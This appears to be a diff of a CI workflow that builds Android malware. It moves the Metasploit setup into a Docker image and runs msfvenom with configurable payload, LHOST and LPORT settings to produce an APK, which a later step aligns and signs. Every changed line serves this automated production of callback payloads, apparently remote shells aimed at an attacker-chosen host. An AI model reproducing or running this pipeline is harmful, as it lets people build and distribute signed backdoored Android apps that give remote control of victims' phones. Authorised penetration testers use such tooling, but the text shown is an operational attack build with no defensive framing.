@@ -47,18 +47,24 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Install Metasploit
+      - name: Pull Metasploit image
         run: |
-          sudo apt-get update -qq
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq metasploit-framework
-          msfvenom --version
+          docker pull metasploitframework/metasploit-framework:latest
+          docker run --rm --entrypoint ./msfvenom \
+            metasploitframework/metasploit-framework:latest --version
 
       - name: Generate APK
         run: |
           set -euo pipefail
-          msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" \
+          docker run --rm \
+            --entrypoint ./msfvenom \
+            -v "$PWD:/data" \
+            -w /data \
+            metasploitframework/metasploit-framework:latest \
+            -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" \
             -a dalvik --platform android \
-            -o "raw-${APK_NAME}.apk"
+            -o "/data/raw-${APK_NAME}.apk"
+          sudo chown "$(id -u):$(id -g)" raw-*.apk
           ls -lh raw-*.apk
 
       - name: Zipalign + Sign
